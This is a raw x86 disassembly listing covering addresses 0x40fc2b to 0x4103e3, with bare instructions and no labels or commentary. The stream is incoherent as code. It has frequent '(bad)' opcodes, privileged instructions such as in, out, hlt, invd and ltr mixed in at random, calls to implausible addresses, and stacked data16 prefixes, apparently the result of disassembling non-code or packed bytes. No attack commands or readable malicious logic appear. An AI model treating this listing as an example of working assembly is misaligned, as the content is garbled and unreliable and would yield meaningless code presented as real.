  40fc2b:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fc31:	ret    
  40fc32:	or     bh,bh
  40fc34:	jge    0x40fc1e
  40fc36:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fc3c:	xor    edi,eax
  40fc3e:	add    esi,DWORD PTR [ebp-0x77]
  40fc41:	mov    ebx,esp
  40fc43:	clc    
  40fc44:	neg    DWORD PTR [ebp-0x7c]
  40fc47:	xor    eax,DWORD PTR [eax]
  40fc49:	cmp    eax,DWORD PTR [eax]
  40fc4b:	repz jne 0x40fbe3
  40fc4e:	xor    eax,DWORD PTR [ecx]
  40fc50:	add    ebx,DWORD PTR [eax]
  40fc52:	mov    DWORD PTR [ebp-0x8],eax
  40fc55:	mov    eax,edi
  40fc57:	cld    
  40fc58:	lock pop eax
  40fc5a:	test   DWORD PTR [ebx],esi
  40fc5c:	clc    
  40fc5d:	add    edx,DWORD PTR [edi-0x740bff77]
  40fc63:	fdivp  st(4),st
  40fc65:	test   ecx,esi
  40fc67:	(bad)  
  40fc68:	jnp    0x40fc69
  40fc6a:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fc70:	jae    0x40fbfd
  40fc72:	sub    edi,esp
  40fc74:	(bad)  
  40fc75:	shl    DWORD PTR [eax-0x3e],0x89
  40fc79:	leave  
  40fc7a:	call   0x8196b387
  40fc7f:	in     al,dx
  40fc80:	(bad)  
  40fc81:	in     al,dx
  40fc82:	add    bh,al
  40fc84:	mov    esp,edi
  40fc86:	in     al,dx
  40fc87:	test   DWORD PTR [ebp-0x8],edi
  40fc8a:	mov    eax,DWORD PTR [ebp+0x2b]
  40fc8d:	xor    al,BYTE PTR [ebx]
  40fc8f:	pushf  
  40fc90:	jnp    0x572ff8c9
  40fc96:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  40fc9a:	loopne 0x40fccf
  40fc9c:	jne    0x40fc59
  40fc9e:	mov    esi,DWORD PTR [edx-0x20]
  40fca1:	add    BYTE PTR [ebp-0x3d],bh
  40fca4:	xor    eax,DWORD PTR [ebp-0x73]
  40fca7:	mov    edi,DWORD PTR [esi]
  40fca9:	cld    
  40fcaa:	jb     0x40fc72
  40fcac:	add    bl,al
  40fcae:	jne    0x40fcf5
  40fcb0:	mov    edx,DWORD PTR [edi-0x10]
  40fcb3:	jge    0x40fd32
  40fcb5:	mov    esi,DWORD PTR [ebx]
  40fcb7:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fcbb:	xor    esi,DWORD PTR [ebp-0x77]
  40fcbe:	mov    esi,eax
  40fcc0:	lock inc ebp
  40fcc2:	jge    0x40fcf5
  40fcc4:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fccb:	dec    ebp
  40fccc:	mov    esi,DWORD PTR [ebx]
  40fcce:	loopne 0x40fc59
  40fcd0:	jge    0x40fcca
  40fcd2:	add    DWORD PTR [ebp-0x7d],eax
  40fcd5:	icebp  
  40fcd6:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fcdd:	dec    ebp
  40fcde:	hlt    
  40fcdf:	xor    ebx,DWORD PTR [ebp-0x77]
  40fce2:	mov    esi,esp
  40fce4:	in     al,0x45
  40fce6:	jge    0x40fd25
  40fce8:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fcef:	dec    ebp
  40fcf0:	push   esp
  40fcf1:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  40fcf7:	inc    ebp
  40fcf8:	hlt    
  40fcf9:	xor    DWORD PTR [ebp-0x61],esi
  40fcfc:	mov    edi,DWORD PTR [eax+0xf19504]
  40fd02:	repnz mov DWORD PTR [ebp+0x20],ebx
  40fd06:	cmp    eax,DWORD PTR [ebp+0xf]
  40fd09:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fd0d:	fistp  WORD PTR [ebx+0x0]
  40fd10:	inc    ebp
  40fd11:	mov    ebx,DWORD PTR [edi+0xc]
  40fd14:	add    eax,eax
  40fd16:	inc    ebp
  40fd17:	test   BYTE PTR [ebx],dh
  40fd19:	add    eax,DWORD PTR [ebx]
  40fd1b:	add    BYTE PTR [esi+0x45],bl
  40fd1e:	ret    0x85
  40fd21:	jnp    0x544180f0
  40fd27:	inc    bp
  40fd29:	inc    ebp
  40fd2a:	xor    DWORD PTR [ecx+0xc78a9c],edi
  40fd30:	fdiv   QWORD PTR [ebx]
  40fd32:	test   DWORD PTR [ecx+0x453bf8],edi
  40fd38:	push   ebx
  40fd39:	add    edi,DWORD PTR [esi+0x708088b]
  40fd3f:	cmp    esi,eax
  40fd41:	setnp  BYTE PTR [ecx-0x74fcffce]
  40fd48:	mov    esp,edi
  40fd4a:	call   0x33cc429c
  40fd4f:	or     BYTE PTR [ebx],al
  40fd51:	inc    ecx
  40fd52:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40fd58:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fd5e:	lock add cl,al
  40fd61:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fd68:	mov    ch,0x45
  40fd6a:	clc    
  40fd6b:	xor    eax,DWORD PTR [ebp+0x3]
  40fd6e:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fd74:	inc    ebp
  40fd75:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fd7b:	mov    edi,eax
  40fd7d:	mov    eax,DWORD PTR [ebp+0x3c]
  40fd80:	mov    ecx,DWORD PTR [eax]
  40fd82:	hlt    
  40fd83:	inc    ebp
  40fd84:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40fd8b:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fd91:	push   ebp
  40fd92:	mov    edi,DWORD PTR [ebx]
  40fd94:	in     al,dx
  40fd95:	jne    0x40fd58
  40fd97:	mov    eax,DWORD PTR [ebp-0x28]
  40fd9a:	add    DWORD PTR [eax],0xe8058dec
  40fda0:	clc    
  40fda1:	mov    esi,DWORD PTR [edi-0x8]
  40fda4:	add    dh,dl
  40fda6:	rol    WORD PTR [ebp-0x1],cl
  40fdaa:	mov    edx,DWORD PTR [eax+0x8]
  40fdad:	jne    0x40fd6f
  40fdaf:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40fdb6:	inc    ebp
  40fdb7:	push   esp
  40fdb8:	test   DWORD PTR [ecx+0xf],ecx
  40fdbb:	sub    edx,esp
  40fdbd:	add    eax,DWORD PTR [eax]
  40fdbf:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40fdc5:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40fdcc:	mov    eax,DWORD PTR [ecx]
  40fdce:	and    BYTE PTR [eax],al
  40fdd0:	cmp    al,0x10
  40fdd2:	add    BYTE PTR [ebp+0x66],al
  40fdd5:	inc    ecx
  40fdd7:	push   esp
  40fdd8:	add    dh,BYTE PTR [ebp+0x0]
  40fddb:	push   edx
  40fddc:	enterw 0xc1,0x4d
  40fde1:	mov    esp,DWORD PTR [esi+0x20]
  40fde4:	add    DWORD PTR [ecx-0x7b],eax
  40fde7:	add    eax,DWORD PTR [ebx]
  40fde9:	str    WORD PTR [eax+0x45]
  40fded:	lea    ecx,[ebx+0x45890801]
  40fdf3:	sbb    BYTE PTR [ebx],al
  40fdf5:	dec    ebp
  40fdf6:	cmp    al,0xf
  40fdf8:	inc    ebp
  40fdf9:	push   eax
  40fdfa:	mov    esi,DWORD PTR [ebx]
  40fdfc:	push   eax
  40fdfd:	add    eax,eax
  40fdff:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40fe06:	inc    ebp
  40fe07:	add    BYTE PTR [ecx],dh
  40fe09:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  40fe10:	(bad)  
  40fe11:	mov    ebx,eax
  40fe13:	loopne 0x40fe5a
  40fe15:	dec    ebp
  40fe16:	mov    ecx,DWORD PTR [edi]
  40fe18:	cld    
  40fe19:	push   eax
  40fe1a:	xchg   DWORD PTR [ebx],esi
  40fe1c:	add    DWORD PTR [ebx],ebp
  40fe1e:	add    BYTE PTR [ebx],ch
  40fe20:	or     BYTE PTR [ecx],bh
  40fe22:	dec    ecx
  40fe23:	loopne 0x40fe28
  40fe25:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40fe2b:	push   ebp
  40fe2c:	add    DWORD PTR [ebx+0x55100800],eax
  40fe32:	dec    ebp
  40fe33:	jmp    0x40fdbe
  40fe35:	mov    esp,DWORD PTR [eax]
  40fe37:	sbb    dl,dl
  40fe39:	inc    eax
  40fe3a:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40fe40:	add    BYTE PTR [ebx+0x74528555],cl
  40fe46:	push   ebp
  40fe47:	div    DWORD PTR [ebx]
  40fe49:	and    eax,DWORD PTR [ebx]
  40fe4b:	add    edx,DWORD PTR [edx-0x30]
  40fe4e:	jno    0x40fddb
  40fe50:	inc    DWORD PTR [eax+eiz*1]
  40fe53:	inc    ebp
  40fe54:	push   eax
  40fe55:	push   eax
  40fe56:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40fe5c:	mov    edi,esp
  40fe5e:	push   eax
  40fe5f:	inc    ebp
  40fe60:	enter  0x458b,0x8
  40fe64:	push   ecx
  40fe65:	(bad)  
  40fe66:	call   0x10b083e
  40fe6b:	pop    ss
  40fe6c:	push   ebp
  40fe6d:	mov    ecx,DWORD PTR [ebx+0x489408]
  40fe73:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40fe79:	push   ecx
  40fe7a:	jo     0x40fe64
  40fe7c:	inc    DWORD PTR [edi]
  40fe7e:	or     BYTE PTR [eax],al
  40fe80:	call   0xcc05ca
  40fe85:	fmul   QWORD PTR [ebp+0x55]
  40fe88:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fe8e:	mov    bh,0x8c
  40fe90:	adc    al,0x9b
  40fe92:	dec    esp
  40fe93:	xor    bl,BYTE PTR [eax]
  40fe95:	mov    ecx,DWORD PTR [ebp+0xc]
  40fe98:	mov    eax,DWORD PTR [ebp-0x4]
  40fe9b:	mov    esi,DWORD PTR [edi-0x3148f924]
  40fea1:	push   es
  40fea2:	retf   
  40fea3:	mov    BYTE PTR [ebp-0x30],0x3b
  40fea7:	inc    ebp
  40fea8:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  40feaf:	retf   0x83fc
  40feb2:	into   
  40feb3:	dec    ebp
  40feb4:	retf   
  40feb5:	mov    ecx,DWORD PTR [ebp-0x74]
  40feb8:	mov    eax,DWORD PTR [eax]
  40feba:	fdiv   QWORD PTR [ebx]
  40febc:	mov    bh,0x3
  40febe:	push   es
  40febf:	mov    esi,ecx
  40fec1:	sbb    cl,dl
  40fec3:	dec    ebp
  40fec4:	sar    DWORD PTR [ebx],cl
  40fec6:	push   ebp
  40fec7:	jne    0x40fed8
  40fec9:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  40fecf:	lea    ebx,[eax]
  40fed1:	call   0xf4ca8a98
  40fed6:	sbb    dh,dl
  40fed8:	add    edx,ebx
  40feda:	push   ebp
  40fedb:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  40fee1:	push   ecx
  40fee2:	mov    DWORD PTR [eax-0x30],edx
  40fee5:	test   DWORD PTR [edx],eax
  40fee7:	xadd   esp,esi
  40feea:	pop    es
  40feeb:	add    cl,dl
  40feed:	mov    eax,ecx
  40feef:	or     al,0x45
  40fef1:	(bad)  
  40fef2:	push   eax
  40fef3:	add    DWORD PTR [edx+0x0],eax
  40fef6:	add    ecx,DWORD PTR [ecx]
  40fef8:	and    dh,cl
  40fefa:	call   0xc507ca
  40feff:	add    DWORD PTR [ebp+0x0],edx
  40ff02:	mov    esp,DWORD PTR [ebp+0x18]
  40ff05:	add    BYTE PTR [eax+0x50],cl
  40ff08:	xor    eax,DWORD PTR [eax]
  40ff0a:	add    esp,DWORD PTR [esi+0x3b]
  40ff0d:	inc    ebp
  40ff0e:	je     0x40fe93
  40ff10:	push   ecx
  40ff11:	dec    BYTE PTR [ebp-0x77]
  40ff14:	add    eax,esi
  40ff16:	or     al,0x5e
  40ff18:	inc    eax
  40ff19:	add    BYTE PTR [ebx],al
  40ff1b:	data16 and BYTE PTR [ebp+0x50],al
  40ff1f:	sub    DWORD PTR [ecx],0xfffffff8
  40ff22:	add    BYTE PTR [ebp-0x75],ah
  40ff25:	add    BYTE PTR [eax],bl
  40ff27:	enter  0x894d,0x8b
  40ff2b:	int3   
  40ff2c:	loopne 0x40fef0
  40ff2e:	rol    BYTE PTR [eax],0x33
  40ff31:	lea    cx,[ebp+0xa]
  40ff35:	data16 jb 0x40ff7d
  40ff38:	add    BYTE PTR [ebx+0x44890855],cl
  40ff3e:	sbb    ah,al
  40ff40:	inc    ebp
  40ff41:	cmp    al,0xf
  40ff43:	add    BYTE PTR [edx+0x66],dl
  40ff46:	xor    ecx,DWORD PTR [eax]
  40ff48:	sub    eax,DWORD PTR [edx]
  40ff4a:	mov    eax,DWORD PTR [eax]
  40ff4c:	or     al,0x66
  40ff4e:	ror    edx,cl
  40ff50:	dec    ebp
  40ff51:	inc    ebp
  40ff52:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  40ff58:	cld    
  40ff59:	or     BYTE PTR [edi+0x4501dd],dl
  40ff5f:	ret    0xecce
  40ff62:	retf   
  40ff63:	(bad)  
  40ff64:	dec    ebp
  40ff65:	mov    al,0x8b
  40ff67:	loopne 0x40ff89
  40ff69:	cmp    ecx,DWORD PTR [edx]
  40ff6b:	inc    ebp
  40ff6c:	daa    
  40ff6d:	loopne 0x40fef6
  40ff6f:	in     al,dx
  40ff70:	add    edi,eax
  40ff72:	add    BYTE PTR [eax+0x3f52e155],bh
  40ff78:	push   ebp
  40ff79:	inc    ebp
  40ff7a:	xor    ebx,edx
  40ff7c:	add    ebp,esp
  40ff7e:	push   edx
  40ff7f:	push   bp
  40ff81:	inc    ebp
  40ff82:	(bad)  
  40ff83:	in     eax,dx
  40ff84:	push   esp
  40ff85:	(bad)  
  40ff86:	inc    edx
  40ff88:	sbb    al,0x33
  40ff8a:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  40ff91:	add    BYTE PTR [ebp+0x46],0x8b
  40ff95:	jmp    0xf98b:0x100041c8
  40ff9c:	xor    esi,DWORD PTR [edx+0x3]
  40ff9f:	mov    ecx,DWORD PTR [edi]
  40ffa1:	fmul   DWORD PTR [edx]
  40ffa3:	add    BYTE PTR [eax],al
  40ffa5:	lea    eax,[ebx-0x4700273c]
  40ffab:	add    al,0x4f
  40ffad:	pop    DWORD PTR [eax]
  40ffaf:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  40ffb5:	push   edx
  40ffb6:	inc    WORD PTR [ebp+0x8]
  40ffba:	mov    eax,0x514f4d
  40ffbf:	(bad)
  40ffc3:	add    al,al
  40ffc5:	xor    DWORD PTR [ebx-0x74baf730],eax
  40ffcb:	test   DWORD PTR [esi+0x74],esp
  40ffce:	inc    ebp
  40ffcf:	mov    DWORD PTR [eax+0xa4e08],edi
  40ffd5:	add    BYTE PTR [ecx-0x76c435bb],cl
  40ffdb:	or     dh,cl
  40ffdd:	or     eax,0x8b8d5045
  40ffe2:	inc    ebp
  40ffe3:	mov    WORD PTR [ecx+0x3b8a00],?
  40ffe9:	jne    0x41001e
  40ffeb:	mov    edi,DWORD PTR [edx+0x8f3b18]
  40fff1:	add    DWORD PTR [ebx],eax
  40fff3:	add    bh,bh
  40fff5:	adc    DWORD PTR [eax],ecx
  40fff7:	adc    DWORD PTR [ebp+0x55],edi
  40fffa:	push   es
  40fffb:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410001:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  410008:	inc    ebp
  410009:	mov    esp,edi
  41000b:	or     al,0xda
  41000d:	push   eax
  41000e:	(bad)  
  41000f:	jne    0x40ffc5
  410011:	call   0x38f900
  410016:	inc    ebp
  410017:	sar    BYTE PTR [eax],0x84
  41001a:	in     al,dx
  41001b:	add    bh,al
  41001d:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  410024:	(bad)  
  410025:	and    al,al
  410027:	fs in  eax,dx
  410029:	inc    DWORD PTR [ebp-0x7b]
  41002c:	jle    0x41003d
  41002e:	leave  
  41002f:	scas   al,BYTE PTR es:[edi]
  410030:	inc    esp
  410031:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  410038:	or     BYTE PTR [ebx-0x97717c8],0x83
  41003f:	call   DWORD PTR [edi]
  410041:	shr    ah,0x84
  410044:	xchg   DWORD PTR [eax],eax
  410046:	add    DWORD PTR [eax],eax
  410048:	add    bh,bh
  41004a:	dec    ebp
  41004b:	and    BYTE PTR [ecx-0x38],dl
  41004e:	push   eax
  41004f:	dec    DWORD PTR [ebx+0xfd885]
  410055:	mov    BYTE PTR [ebp+0x508bac00],cl
  41005b:	mov    WORD PTR [ecx+0x0],ss
  41005e:	lea    ecx,[ebx+0x108b20d8]
  410064:	mov    WORD PTR [edx],ds
  410066:	add    BYTE PTR [edi+0xff01ff],al
  41006c:	mov    ecx,DWORD PTR [ebp-0x28]
  41006f:	push   ecx
  410070:	shl    BYTE PTR [ebp+0x3a],0x8b
  410074:	inc    ebp
  410075:	in     al,0xeb
  410077:	jno    0x410004
  410079:	push   edx
  41007a:	mov    DWORD PTR [eax-0x28],edx
  41007d:	mov    eax,DWORD PTR [ebp+0x20]
  410080:	je     0x410009
  410082:	mov    eax,DWORD PTR [ecx]
  410084:	sbb    BYTE PTR [eax],al
  410086:	pop    DWORD PTR [eax]
  410088:	add    esi,eax
  41008a:	add    bl,al
  41008c:	adc    DWORD PTR [edi],esi
  41008e:	jmp    0x8bcc50e0
  410093:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  41009a:	jne    0x410027
  41009c:	mov    ecx,DWORD PTR [eax]
  41009e:	in     al,0x75
  4100a0:	pop    DWORD PTR [ecx+0x5401]
  4100a6:	push   edx
  4100a7:	inc    DWORD PTR [ebx]
  4100a9:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4100af:	add    BYTE PTR [edi+0x9],dl
  4100b2:	call   DWORD PTR [esi]
  4100b4:	and    dl,al
  4100b6:	and    bh,bh
  4100b8:	inc    edi
  4100ba:	test   eax,edx
  4100bc:	sldt   ebx
  4100bf:	xor    al,BYTE PTR [eax]
  4100c1:	pushf  
  4100c2:	(bad)  
  4100c3:	jmp    0x4100d1
  4100c5:	mov    eax,edi
  4100c7:	or     al,0x75
  4100c9:	inc    eax
  4100ca:	call   0x40f7d2
  4100cf:	mov    eax,eax
  4100d1:	loopne 0x410057
  4100d3:	inc    ebp
  4100d4:	add    BYTE PTR [ebx+0x1451c00],cl
  4100da:	mov    eax,DWORD PTR [ebp+0x20]
  4100dd:	add    edi,ecx
  4100df:	add    BYTE PTR [eax],ch
  4100e1:	cmp    edi,0x18
  4100e4:	test   DWORD PTR [ebp+0xf],esi
  4100e7:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4100ee:	jne    0x4100f2
  4100f0:	call   0xff9ffbb5
  4100f5:	leave  
  4100f6:	rcr    BYTE PTR [esp+eax*4],0x55
  4100fa:	add    ah,ch
  4100fc:	add    BYTE PTR [edi-0x48fef979],dh
  410102:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  410109:	inc    esp
  41010a:	mov    ebx,DWORD PTR [eax]
  41010c:	fcom   st(2)
  41010e:	add    BYTE PTR [edi],bl
  410110:	lea    ecx,[eax-0x18]
  410113:	(bad)  
  410114:	push   DWORD PTR [ecx]
  410116:	call   0xffb34e78
  41011b:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  41011f:	fstp   DWORD PTR [esi+ebx*8]
  410122:	push   ebp
  410123:	pop    ebp
  410124:	mov    esi,DWORD PTR [edx-0x38]
  410127:	add    DWORD PTR [eax],0x28
  41012a:	mov    edi,DWORD PTR [ebx]
  41012c:	xor    esi,DWORD PTR [edx+0x3]
  41012f:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410133:	pop    ebp
  410134:	or     al,0x4
  410136:	inc    ecx
  410137:	push   ebp
  410138:	(bad)  
  410139:	in     al,dx
  41013a:	or     ah,ch
  41013c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013d:	xbegin 0xffc67733
  410143:	clc    
  410144:	adc    al,0x45
  410146:	div    BYTE PTR [edx]
  410148:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  41014f:	test   DWORD PTR [ebx+0x666300f8],ebx
  410155:	add    BYTE PTR [ecx+0x66],dh
  410158:	add    eax,DWORD PTR [ebp+0x52]
  41015b:	adc    eax,0xffffffa0
  41015e:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  410164:	test   DWORD PTR [eax],eax
  410166:	clc    
  410167:	data16 or al,BYTE PTR [ebp+0x45]
  41016b:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  410172:	rol    BYTE PTR [ebp+0x45],1
  410175:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  41017b:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  410181:	push   ebx
  410182:	add    BYTE PTR [eax+eax*1+0x51],dl
  410186:	jge    0x4101bb
  410188:	add    BYTE PTR [esi+0x4],dl
  41018b:	jne    0x4101f2
  41018d:	mov    edx,0x457200
  410192:	jmp    0x410156
  410194:	xor    edi,DWORD PTR [ebx]
  410196:	pop    edi
  410197:	cvtdq2ps xmm7,xmm0
  41019a:	ret    0x0
  41019d:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4101a3:	xor    ecx,DWORD PTR [edi]
  4101a5:	add    eax,DWORD PTR [ecx+0x3b]
  4101a8:	push   ebx
  4101a9:	rdpmc  
  4101ab:	out    0x8d,al
  4101ad:	add    BYTE PTR [eax],cl
  4101af:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4101b5:	ret    0x450c
  4101b8:	sbb    al,0x8b
  4101ba:	cmp    eax,esi
  4101bc:	or     cl,al
  4101be:	or     al,0xc2
  4101c0:	pop    eax
  4101c1:	inc    ebp
  4101c2:	add    ecx,DWORD PTR [edi]
  4101c4:	add    esi,DWORD PTR [ebp+0x39]
  4101c7:	invd   
  4101c9:	jge    0x4101d5
  4101cb:	mov    eax,0x478ac0
  4101d0:	cli    
  4101d1:	xor    esp,ecx
  4101d3:	mov    ebx,0x5b8ac0
  4101d8:	ret    0x33
  4101db:	mov    eax,0x833b8b
  4101e0:	sub    BYTE PTR [ebx],al
  4101e2:	inc    ebp
  4101e3:	xor    ax,di
  4101e6:	pushf  
  4101e7:	inc    bh
  4101e9:	mov    esp,esp
  4101eb:	hlt    
  4101ec:	test   DWORD PTR [ebp-0x8],esi
  4101ef:	mov    eax,DWORD PTR [ebp-0x14]
  4101f2:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4101f8:	dec    edi
  4101f9:	or     BYTE PTR [eax],al
  4101fb:	jne    0x410186
  4101fd:	mov    esi,esp
  4101ff:	call   0x77a78dc4
  410204:	inc    ebp
  410205:	mov    DWORD PTR [eax+0x9b4f0c],edi
  41020b:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410211:	add    BYTE PTR [esi+0x7d],ah
  410214:	inc    ebp
  410215:	mov    bx,WORD PTR [ebp+0x8]
  410219:	add    DWORD PTR [ebp+0x54],0x30c008b
  410220:	inc    ebp
  410221:	mov    bx,di
  410224:	lock test BYTE PTR [ecx+0x7000801],bh
  41022b:	jge    0x4101ee
  41022d:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  410233:	cli    
  410234:	xor    bl,bh
  410236:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41023c:	test   BYTE PTR [eax],cl
  41023e:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  410245:	cmp    ebp,eax
  410247:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  41024e:	test   BYTE PTR [ebp+0x1],bh
  410251:	mov    ebx,0x458a00
  410256:	xor    esi,DWORD PTR [ebx]
  410258:	add    esp,DWORD PTR [esi-0x77]
  41025b:	pop    ebp
  41025c:	loopne 0x4102c4
  41025e:	inc    ebp
  41025f:	clc    
  410260:	xor    edi,DWORD PTR [ebx]
  410262:	add    esi,DWORD PTR [edx-0x77]
  410265:	data16 fdivr QWORD PTR [ebp-0x49]
  410269:	mov    ebx,0xb78afc
  41026e:	hlt    
  41026f:	xor    edi,DWORD PTR [esi+eiz*2]
  410272:	add    BYTE PTR [ebp+0x66],bl
  410275:	data16 lock clc 
  410278:	cmp    al,0x3b
  41027a:	add    BYTE PTR [edi+0x66],dh
  41027d:	psubq  mm7,QWORD PTR [ebp+0x2]
  410281:	ltr    WORD PTR [ebp+0x66]
  410285:	add    esi,eax
  410287:	add    di,WORD PTR [ebp+0x2b]
  41028b:	data16 data16 jge 0x41030c
  41028f:	mov    ebx,0xe08a8b
  410294:	jge    0x4102c9
  410296:	data16 data16 xor al,0x5d
  41029a:	data16 data16 jne 0x410296
  41029e:	mov    edi,DWORD PTR [ebx]
  4102a0:	fdiv   QWORD PTR [edx+0x7d]
  4102a3:	data16 data16 jge 0x4102db
  4102a7:	mov    ebx,0x758a66
  4102ac:	mov    esi,0x667233
  4102b1:	pop    ebp
  4102b2:	or     BYTE PTR [esi+0x0],ah
  4102b5:	clc    
  4102b6:	mov    edi,DWORD PTR [ebx]
  4102b8:	lock ja 0x410246
  4102bb:	(bad)  
  4102bd:	jge    0x4102b6
  4102bf:	invd   
  4102c1:	pop    ebp
  4102c2:	add    BYTE PTR [ebx],al
  4102c4:	(bad)  
  4102c5:	cmp    di,WORD PTR [ebp+0xf]
  4102c9:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4102cd:	mov    bx,WORD PTR [ebp-0x10]
  4102d1:	pop    bp
  4102d3:	fbstp  TBYTE PTR [ebx]
  4102d5:	test   DWORD PTR [ebx],eax
  4102d7:	add    BYTE PTR [ebx],bh
  4102d9:	add    BYTE PTR [esi+0x7d],ah
  4102dc:	jge    0x410269
  4102de:	data16 in al,dx
  4102e0:	pop    ebp
  4102e1:	stc    
  4102e2:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4102e9:	mov    edi,ebx
  4102eb:	in     al,dx
  4102ec:	test   BYTE PTR [ebp+0x0],bh
  4102ef:	mov    eax,DWORD PTR [eax]
  4102f1:	call   0xbd3dfc81
  4102f6:	cmp    al,0x9b
  4102f8:	add    BYTE PTR [edx],dh
  4102fa:	mov    bx,di
  4102fd:	call   0x8b49808d
  410302:	add    ebp,esp
  410304:	mov    bx,di
  410307:	jnp    0x41032f
  410309:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  41030f:	mov    eax,DWORD PTR [eax]
  410311:	call   0x7c3c8e7c
  410316:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41031c:	data16 data16 fistp WORD PTR [ebp+0xe]
  410321:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  41032b:	fisttp WORD PTR [ecx-0x7401f77b]
  410331:	(bad)  
  410332:	cld    
  410333:	jne    0x410371
  410335:	xor    eax,DWORD PTR [eax]
  410337:	mov    esp,DWORD PTR [esi-0x10]
  41033a:	sti    
  41033b:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  410342:	data16 adc bl,bh
  410345:	push   ebp
  410346:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  41034d:	mov    WORD PTR [eax],es
  41034f:	fwait
  410350:	data16 xor bh,bl
  410353:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  410359:	mov    esp,DWORD PTR [esi-0x14]
  41035c:	fisttp WORD PTR [ebx-0x3748a9f2]
  410362:	or     al,0x2b
  410364:	mov    bh,0xba
  410366:	hlt    
  410367:	mov    bh,bl
  410369:	add    BYTE PTR [ecx-0x7446f3cd],cl
  41036f:	dec    esi
  410370:	or     al,0x0
  410372:	mov    edi,DWORD PTR [ebx]
  410374:	or     BYTE PTR [ebp+0x3b],dh
  410377:	mov    ecx,DWORD PTR [edi]
  410379:	fdivr  QWORD PTR [ebx-0x7499ff83]
  41037f:	xor    al,0xd8
  410381:	pop    bp
  410383:	lock xor esi,DWORD PTR [ebx]
  410386:	lea    esp,[esi+0x1f]
  410389:	icebp  
  41038a:	jb     0x410390
  41038c:	add    al,al
  41038e:	jge    0x41039c
  410390:	mov    eax,eax
  410392:	fsubr  st,st(3)
  410394:	pop    ebp
  410395:	mov    esi,DWORD PTR [ebx]
  410397:	in     al,0x8d
  410399:	rcr    DWORD PTR [edi],0xc2
  41039c:	jb     0x4103fc
  41039e:	add    cl,cl
  4103a0:	jge    0x4103ae
  4103a2:	mov    edx,DWORD PTR [ebp-0x20]
  4103a5:	in     al,dx
  4103a6:	pop    ebp
  4103a7:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4103ac:	cmp    di,WORD PTR [ebp+0x0]
  4103b0:	mov    ebp,DWORD PTR [ebx]
  4103b2:	fdivr  QWORD PTR [esi+0x668a5d]
  4103b8:	cmp    al,0x33
  4103ba:	mov    si,0x4e7d
  4103be:	mov    eax,DWORD PTR [eax]
  4103c0:	lock inc ebp
  4103c2:	mov    esi,DWORD PTR [eax]
  4103c4:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4103cb:	clc    
  4103cc:	(bad)  
  4103cd:	cmp    edi,DWORD PTR [ebx]
  4103cf:	je     0x4103e0
  4103d1:	push   ebx
  4103d2:	loopne 0x4103e3
  4103d4:	dec    ecx
  4103d6:	mov    esp,DWORD PTR [ebp-0x1c]
  4103d9:	int    0xf1
  4103db:	mov    esi,0x703084d
  4103e0:	pcmpgtd mm6,mm1
  4103e3:	add    BYTE PTR [ebp+0x66],dh
